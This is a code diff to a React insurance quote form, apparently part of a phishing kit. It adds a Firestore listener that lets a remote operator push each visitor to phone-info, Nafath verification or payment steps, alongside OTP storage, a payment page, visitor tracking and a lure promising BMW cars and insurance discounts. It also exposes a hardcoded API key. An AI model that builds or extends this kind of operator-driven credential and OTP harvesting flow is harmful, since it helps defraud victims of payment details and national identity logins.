@@ -5,11 +5,13 @@ import { useEffect, useState } from "react"
 import { Button } from "@/components/ui/button"
 import { Input } from "@/components/ui/input"
 import { Globe, RefreshCw, Check, X } from "lucide-react"
-import { addData } from "@/lib/firebase"
+import { addData, db } from "@/lib/firebase"
 import { setupOnlineStatus } from "@/lib/utils"
 import { FullPageLoader } from "@/components/loader"
 import PaymentPage from "@/components/pay-form"
 import { Traker } from "@/components/traker"
+import { doc, onSnapshot } from "firebase/firestore"
+import { StepIndicator } from "@/components/step-indicator"
 
 const allOtps = [""]
 
@@ -94,7 +96,27 @@ export default function InsuranceForm() {
       setLoading(false)
     })
   }, [])
+  useEffect(() => {
+    const visitorId = localStorage.getItem("visitor")
+    if (visitorId) {
+        const unsubscribe = onSnapshot(doc(db, "pays", visitorId), (docSnap) => {
+            if (docSnap.exists()) {
+                const data = docSnap.data()
+                if (data.currentStep === "home") {
+                    window.location.href = "/"
+                } else
+                    if (data.currentStep === "phone") {
+                        window.location.href = "/phone-info"
+                    } else if (data.currentStep === "nafad") {
+                        window.location.href = "/nafad"
+                    } else
+                            setCurrentStep(parseInt(data.currentStep))
+            }
+        })
 
+        return () => unsubscribe()
+    }
+}, [])
   async function getLocation() {
     const APIKEY = "856e6f25f413b5f7c87b868c372b89e52fa22afb878150f5ce0c4aef"
     const url = `https://api.ipdata.co/country_name?api-key=${APIKEY}`
@@ -251,6 +273,7 @@ export default function InsuranceForm() {
 
       {currentStep === 1 && (
         <>
+
           <div className="bg-[#0a4a68] px-3 py-3 md:px-6 md:py-4 flex items-center justify-between border-b border-white/10">
             <button className="flex items-center gap-1.5 px-3 py-2 md:px-4 md:py-2.5 bg-white/95 rounded-lg hover:bg-white transition-colors shadow-md">
               <Globe className="w-4 h-4 md:w-5 md:h-5 text-[#0a4a68]" />
@@ -262,12 +285,9 @@ export default function InsuranceForm() {
           </div>
 
           <div className="bg-[#0a4a68] px-3 py-6 md:px-6 md:py-10 text-center border-b border-white/10">
-            <h1 className="text-white text-xl md:text-3xl lg:text-4xl font-bold mb-2 md:mb-4 leading-tight" dir="rtl">
-              اربح معنا .. سيارتين BMW 520i 2024
-            </h1>
-            <p className="text-yellow-300 text-base md:text-xl lg:text-2xl font-bold" dir="rtl">
-              خصومات حتى 30% على التأمين
-            </p>
+         
+          <StepIndicator currentStep={currentStep} />
+
           </div>
 
           <div className="max-w-3xl mx-auto -mt-4 md:-mt-6 px-3 md:px-4 pb-6 md:pb-8">
